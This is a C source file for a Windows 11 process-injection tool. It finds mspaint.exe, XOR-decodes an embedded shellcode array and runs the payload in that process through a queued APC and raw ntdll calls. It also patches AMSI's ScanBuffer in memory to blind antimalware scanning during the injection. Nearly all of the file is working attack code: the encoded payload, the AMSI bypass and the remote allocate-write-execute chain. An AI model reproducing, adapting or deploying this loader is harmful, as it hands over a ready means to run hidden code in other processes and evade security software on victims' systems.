// 0xtengu    
// native apc injection                                   
// Windows 11 24H2 - 26100

#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <stdio.h>

#define TARGET_PROCESS_NAME  L"mspaint.exe"

// -----------------------------------------------------------------------------------------------
unsigned char shellcode[] =
"\x56\xe2\x29\x4e\x5a\x42\x6a\xaa\xaa\xaa\xeb\xfb\xeb\xfa\xf8\xfb"
"\xfc\xe2\x9b\x78\xcf\xe2\x21\xf8\xca\xe2\x21\xf8\xb2\xe2\x21\xf8"
"\x8a\xe2\x21\xd8\xfa\xe2\xa5\x1d\xe0\xe0\xe7\x9b\x63\xe2\x9b\x6a"
"\x06\x96\xcb\xd6\xa8\x86\x8a\xeb\x6b\x63\xa7\xeb\xab\x6b\x48\x47"
"\xf8\xeb\xfb\xe2\x21\xf8\x8a\x21\xe8\x96\xe2\xab\x7a\x21\x2a\x22"
"\xaa\xaa\xaa\xe2\x2f\x6a\xde\xcd\xe2\xab\x7a\xfa\x21\xe2\xb2\xee"
"\x21\xea\x8a\xe3\xab\x7a\x49\xfc\xe2\x55\x63\xeb\x21\x9e\x22\xe2"
"\xab\x7c\xe7\x9b\x63\xe2\x9b\x6a\x06\xeb\x6b\x63\xa7\xeb\xab\x6b"
"\x92\x4a\xdf\x5b\xe6\xa9\xe6\x8e\xa2\xef\x93\x7b\xdf\x72\xf2\xee"
"\x21\xea\x8e\xe3\xab\x7a\xcc\xeb\x21\xa6\xe2\xee\x21\xea\xb6\xe3"
"\xab\x7a\xeb\x21\xae\x22\xe2\xab\x7a\xeb\xf2\xeb\xf2\xf4\xf3\xf0"
"\xeb\xf2\xeb\xf3\xeb\xf0\xe2\x29\x46\x8a\xeb\xf8\x55\x4a\xf2\xeb"
"\xf3\xf0\xe2\x21\xb8\x43\xfd\x55\x55\x55\xf7\xe2\x10\xab\xaa\xaa"
"\xaa\xaa\xaa\xaa\xaa\xe2\x27\x27\xab\xab\xaa\xaa\xeb\x10\x9b\x21"
"\xc5\x2d\x55\x7f\x11\x4a\xb7\x80\xa0\xeb\x10\x0c\x3f\x17\x37\x55"
"\x7f\xe2\x29\x6e\x82\x96\xac\xd6\xa0\x2a\x51\x4a\xdf\xaf\x11\xed"
"\xb9\xd8\xc5\xc0\xaa\xf3\xeb\x23\x70\x55\x7f\xc4\xc5\xde\xcf\xda"
"\xcb\xce\x84\xcf\xd2\xcf\xaa";

// -----------------------------------------------------------------------------------------------

unsigned char key = 0xAA;

// ---[ XOR decoding ]---------------------------------------
void xor (unsigned char* data, int length, unsigned char key)
{
    for (int i = 0; i < length; i++)
    {
        data[i] ^= key;
    }
}

/* -----------------------------------------------------------------
Credit: mr. d0x
   AMSI ScanBuffer patcher: toggles a conditional jump (JE <-> JNE)
   enable = TRUE: patch JE -> JNE (bypass AMSI)
   enable = FALSE: restore original JE
    could technically hit some crazy edge case where the je isn’t
    in the first 0x1000 bytes or the opcode isn’t exactly 0x74
---------------------------------------------------------------- */
// patch or restore the amsi scan buffer je instruction
BOOL PatchAmsiScanBuffer(BOOL enable)
{
    // cache the patch location so we only scan once
    static BYTE* patch_loc = NULL;

    // first call: find the je we want to flip
    if (!patch_loc)
    {
        // load amsi.dll if it isn’t already
        HMODULE hamsi = LoadLibraryW(L"amsi.dll");
        if (!hamsi)
            return FALSE;

        // get pointer to the start of amsiscanbuffer
        BYTE* fn = (BYTE*)GetProcAddress(hamsi, "AmsiScanBuffer");
        if (!fn)
            return FALSE;

        // scan the first 0x1000 bytes for our je -> mov eax marker
        for (BYTE* p = fn, *end = fn + 0x1000; p < end; ++p)
        {
            // look for 0x74 (je) followed by a relative offset
            if (p[0] == 0x74)
            {
                BYTE off = p[1];              // relative jump offset
                BYTE* dest = p + 2 + off;     // where je lands
                // check for mov eax, xxxx (0xb8) at the target
                if (dest[0] == 0xB8)
                {
                    patch_loc = p;            // bingo, save location
                    break;
                }
            }
        }

        // if we never found it, bail out
        if (!patch_loc)
            return FALSE;
    }

    // make that single byte writable
    DWORD old_prot;
    if (!VirtualProtect(patch_loc, 1, PAGE_EXECUTE_READWRITE, &old_prot))
        return FALSE;

    // flip 0x74 (je) to 0x75 (jne) when enabling, or back to 0x74 when disabling
    *patch_loc = enable ? 0x75 : 0x74;

    // restore original protection and clear cpu icache for that byte
    VirtualProtect(patch_loc, 1, old_prot, &old_prot);
    FlushInstructionCache(GetCurrentProcess(), patch_loc, 1);

    return TRUE;
}

/// ---[ NT ]-----------------------------------------
#ifndef NT_SUCCESS
// ntstatus codes can be weird, so this macro just checks if the status is non-negative
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef THREAD_CREATE_FLAGS_CREATE_SUSPENDED
// create thread suspended flag isn’t always in the sdk, so we define it here
#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001UL
#endif

#ifndef QUEUE_USER_APC_SPECIAL_USER_APC
// special apc flag for queueing apcs, again some sdk’s omit it
#define QUEUE_USER_APC_SPECIAL_USER_APC ((HANDLE)0x1)
#endif

// ----[ nt typedefs not always present in sdk ]-----------------------

// these typedefs let us call low-level ntdll routines directly
typedef VOID(NTAPI* PPS_APC_ROUTINE)(
    PVOID SystemArgument1,
    PVOID SystemArgument2,
    PVOID SystemArgument3,
    PCONTEXT ContextRecord
    );

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemoryEx)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG PageProtection,
    PMEM_EXTENDED_PARAMETER ExtendedParameters,
    ULONG ExtendedParameterCount
    );

// write virtual memory directly into another process
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
    );

// change memory permissions in remote process
typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtection,
    PULONG OldProtection
    );

// create a thread in another process (or local), more advanced than CreateThread
typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
    );

// queue an apc (asynchronous procedure call) on a thread
typedef NTSTATUS(NTAPI* pNtQueueApcThread)(
    HANDLE ThreadHandle,
    PPS_APC_ROUTINE ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
    );

// resume a suspended thread and trigger apcs if any
typedef NTSTATUS(NTAPI* pNtAlertResumeThread)(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount
    );

// ----[ resolved pointers ]---------------------------------------------------

// pointers to hold the real ntdll functions once we find them
static pNtAllocateVirtualMemoryEx  _NtAllocateVirtualMemoryEx = NULL;
static pNtWriteVirtualMemory       _NtWriteVirtualMemory = NULL;
static pNtProtectVirtualMemory     _NtProtectVirtualMemory = NULL;
static pNtCreateThreadEx           _NtCreateThreadEx = NULL;
static pNtQueueApcThread           _NtQueueApcThread = NULL;
static pNtAlertResumeThread        _NtAlertResumeThread = NULL;

static PPS_APC_ROUTINE             _RtlDispatchAPC = NULL;
static PVOID                       _RtlExitUserThread = NULL;

// this function grabs all the ntdll exports we need, returns true if successful
static BOOL ResolveNtdllApis(void)
{
    // get handle to ntdll (our source of power)
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll)
        return FALSE;

    // for each pointer, if it’s not set yet, fetch it by name
    if (!_NtAllocateVirtualMemoryEx)
        _NtAllocateVirtualMemoryEx = (pNtAllocateVirtualMemoryEx)
        GetProcAddress(hNtdll, "NtAllocateVirtualMemoryEx");

    if (!_NtWriteVirtualMemory)
        _NtWriteVirtualMemory = (pNtWriteVirtualMemory)
        GetProcAddress(hNtdll, "NtWriteVirtualMemory");

    if (!_NtProtectVirtualMemory)
        _NtProtectVirtualMemory = (pNtProtectVirtualMemory)
        GetProcAddress(hNtdll, "NtProtectVirtualMemory");

    if (!_NtCreateThreadEx)
        _NtCreateThreadEx = (pNtCreateThreadEx)
        GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!_NtQueueApcThread)
        _NtQueueApcThread = (pNtQueueApcThread)
        GetProcAddress(hNtdll, "NtQueueApcThread");

    if (!_NtAlertResumeThread)
        _NtAlertResumeThread = (pNtAlertResumeThread)
        GetProcAddress(hNtdll, "NtAlertResumeThread");

    // try to grab the rtl dispatch apc function by name first
    // this is what windows uses internally to run queued apcs
    if (!_RtlDispatchAPC)
    {
        // get it by its usual exported name
        _RtlDispatchAPC = (PPS_APC_ROUTINE)GetProcAddress(hNtdll, "RtlDispatchAPC");
        // if for some reason that export is hidden, windows sometimes exposes it by ordinal 8
        if (!_RtlDispatchAPC)
            _RtlDispatchAPC = (PPS_APC_ROUTINE)GetProcAddress(hNtdll, (LPCSTR)8);
    }

    // next, grab the function that cleanly exits a user thread
    // this helps us bail out of a thread once our payload is done
    if (!_RtlExitUserThread)
        _RtlExitUserThread = GetProcAddress(hNtdll, "RtlExitUserThread");

    // at this point we’ve tried resolving all the apis we need
    // return true only if every single pointer is non-null
    return _NtAllocateVirtualMemoryEx && _NtWriteVirtualMemory &&
        _NtProtectVirtualMemory && _NtCreateThreadEx &&
        _NtQueueApcThread && _NtAlertResumeThread &&
        _RtlDispatchAPC && _RtlExitUserThread;
}

    // ===[ Process Handle Lookup ]==
    BOOL OpenProcessByName(LPCWSTR targetName, DWORD * outPid, HANDLE * outHandle)
    {
        if (!targetName || !outPid || !outHandle)
        {
            printf("[ERROR] OpenProcessByName: invalid argument(s)\n");
            return FALSE;
        }

        *outPid = 0;
        *outHandle = NULL;

        HANDLE snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshotHandle == INVALID_HANDLE_VALUE)
        {
            printf("[ERROR] CreateToolhelp32Snapshot failed (err=%lu)\n", GetLastError());
            return FALSE;
        }

        PROCESSENTRY32W processEntry = { sizeof(processEntry) };

        if (!Process32FirstW(snapshotHandle, &processEntry))
        {
            printf("[ERROR] Process32FirstW failed (err=%lu)\n", GetLastError());
            CloseHandle(snapshotHandle);
            return FALSE;
        }

        do {
            if (_wcsicmp(processEntry.szExeFile, targetName))
                continue;

            *outPid = processEntry.th32ProcessID;
            *outHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *outPid);

            if (!*outHandle)
            {
                printf("[ERROR] OpenProcess PID %lu failed (err=%lu)\n",
                    *outPid, GetLastError());
                CloseHandle(snapshotHandle);
                return FALSE;
            }

            printf("[INFO] Opened %ws [PID %lu]\n", targetName, *outPid);
            CloseHandle(snapshotHandle);
            return TRUE;

        } while (Process32NextW(snapshotHandle, &processEntry));

        printf("[WARN] Process \"%ws\" not found\n", targetName);
        CloseHandle(snapshotHandle);
        return FALSE;
    }

    /* ----[ injectAPC ]------------------------------------------------------------------
      apc injection using nt syscalls
      remotely injects and executes shellcode buffer via apc on a target process handle
    ------------------------------------------------------------------------------------ */
    static BOOL injectAPC(HANDLE hp, unsigned char* buf, SIZE_T len)
    {
        // resolve all raw ntdll syscall pointers we need:
        //  alloc, write, protect, create thread, queue apc, resume thread
        // if any of these fail, we cannot inject
        if (!ResolveNtdllApis())
            return FALSE;

        // 1) allocate a read/write region in the target process
        //    remote will receive the base address of the allocation
        //    region is the size we want (len bytes)
        PVOID remote = NULL;
        SIZE_T region = len;
        NTSTATUS st = _NtAllocateVirtualMemoryEx(
            hp,                             // target process handle
            &remote,                        // out: allocated base address
            &region,                        // in/out: requested size
            MEM_COMMIT | MEM_RESERVE,       // commit pages + reserve address space
            PAGE_READWRITE,                 // allow read/write so we can copy payload
            NULL,                           // no extended parameters
            0);
        if (!NT_SUCCESS(st) || !remote)
        {
            // allocation failed or returned null pointer
            printf("[-] NtAllocateVirtualMemoryEx failed: 0x%08X\n", st);
            return FALSE;
        }

        // 2) write the payload buffer into the newly allocated memory
        //    written will hold how many bytes were actually written
        SIZE_T written = 0;
        st = _NtWriteVirtualMemory(
            hp,        // target process handle
            remote,    // destination in remote process
            buf,       // local buffer containing our payload
            len,       // number of bytes to write
            &written); // out: actual bytes written
        if (!NT_SUCCESS(st) || written != len)
        {
            // either syscall failed or only partial write happened
            printf("[-] NtWriteVirtualMemory failed: 0x%08X (wrote %llu/%llu)\n",
                st, (unsigned long long)written, (unsigned long long)len);
            return FALSE;
        }

        // 3) change the memory protection to execute/read
        //    so the cpu can execute the shellcode but not modify it
        ULONG oldProt = 0;
        PVOID base = remote;
        SIZE_T size = region;
        st = _NtProtectVirtualMemory(
            hp,                   // target process handle
            &base,                // in/out: base address of region
            &size,                // in/out: size of region
            PAGE_EXECUTE_READ,    // new protection flags
            &oldProt);            // out: previous protection
        if (!NT_SUCCESS(st))
        {
            printf("[-] NtProtectVirtualMemory failed: 0x%08X\n", st);
            return FALSE;
        }

        // 4) create a new thread in the remote process in suspended state
        //    we set its start routine to rtlExitUserThread so it will exit
        //    after our apc has run
        HANDLE th = NULL;
        st = _NtCreateThreadEx(
            &th,                          // out: new thread handle
            THREAD_ALL_ACCESS,            // full access rights
            NULL,                         // no special object attrs
            hp,                           // process handle to create thread in
            _RtlExitUserThread,           // start routine: exit immediately
            0,                            // argument to exit routine (ignored)
            THREAD_CREATE_FLAGS_CREATE_SUSPENDED, // create suspended
            0, 0, 0,                      // zero bits, stack sizes, attr list
            NULL);
        if (!NT_SUCCESS(st) || !th)
        {
            printf("[-] NtCreateThreadEx failed: 0x%08X\n", st);
            return FALSE;
        }

        // 5) queue an apc on the suspended thread
        //    use RtlDispatchAPC so that when the thread resumes it will run our payload
        st = _NtQueueApcThread(
            th,              // target thread handle
            _RtlDispatchAPC, // system routine to dispatch the apc
            remote,          // first arg: pointer to our shellcode
            NULL, NULL);     // other args not used
        if (!NT_SUCCESS(st))
        {
            // apc queue failed, clean up and abort
            printf("[-] NtQueueApcThread failed: 0x%08X\n", st);
            CloseHandle(th);
            return FALSE;
        }

        // 6) resume the thread and alert it
        //    this drops the suspend count so the apc fires before any normal thread start
        ULONG prev = 0;
        st = _NtAlertResumeThread(
            th,   // thread to resume
            &prev // out: previous suspend count
        );
        if (!NT_SUCCESS(st))
        {
            printf("[-] NtAlertResumeThread failed: 0x%08X\n", st);
            CloseHandle(th);
            return FALSE;
        }

        // success: apc is queued and shellcode should execute immediately
        printf("[+] APC queued; thread resumed (prev suspend count %lu)\n", prev);
        CloseHandle(th);
        return TRUE;
    }

    //////////////////////////////////////
    //  Main      ///////////////////////
    ////////////////////////////////////
    int wmain(void)
    {
        puts("[*] Starting APC injection");

        // AMSI patch
        if (!PatchAmsiScanBuffer(TRUE))
        {
            puts("[-] AMSI patch failed");
            return 1;
        }
        puts("[+] AMSI bypass enabled");

        // find target process
        DWORD pid; HANDLE hProc;
        if (!OpenProcessByName(TARGET_PROCESS_NAME, &pid, &hProc))
        {
            puts("[-] Target not found");
            PatchAmsiScanBuffer(FALSE);
            return 1;
        }
        printf("[+] Target %ws found\n[i]PID:    %lu\n[i]HANDLE: 0x%p\n",
            TARGET_PROCESS_NAME, pid, hProc);

        // decode payload
        xor(shellcode, sizeof(shellcode), key);
        puts("[+] Shellcode decoded");
        printf("[+] Local shellcode buffer: 0x%p (%zu bytes)\n", shellcode, sizeof(shellcode));

        printf("[*] Press Enter to inject"); getchar();

        //NT APC injection
        if (!injectAPC(hProc, shellcode, sizeof(shellcode)))
        {
            puts("[-] injectAPC failed");
            CloseHandle(hProc);
            PatchAmsiScanBuffer(FALSE);
            puts("[+] AMSI restored");
            return 1;
        }

        puts("[+] Injection path complete");
        CloseHandle(hProc);

        PatchAmsiScanBuffer(FALSE);
        puts("[+] AMSI restored");
        return 0;
    }
